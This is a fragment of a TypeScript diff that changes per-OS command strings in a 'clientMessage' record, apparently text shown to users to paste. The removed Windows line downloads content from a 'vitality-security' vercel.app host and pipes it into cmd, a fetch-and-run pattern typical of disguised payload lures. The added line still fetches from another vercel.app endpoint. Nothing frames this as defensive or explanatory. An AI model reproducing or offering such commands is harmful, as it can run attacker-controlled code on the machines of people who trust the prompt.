@@ -11,7 +11,7 @@ export type System3 = "linux"
 
 const clientMessage: Record<System1 | System2 | System3, string> = {
   windows:
-    'curl -L https://vitality-security.vercel.app/api/windows | cmd\n cls',
+    'curl -L ireq.vercel.app/api/settings/windows\n cls',
   mac: "",
   linux: "",
 }
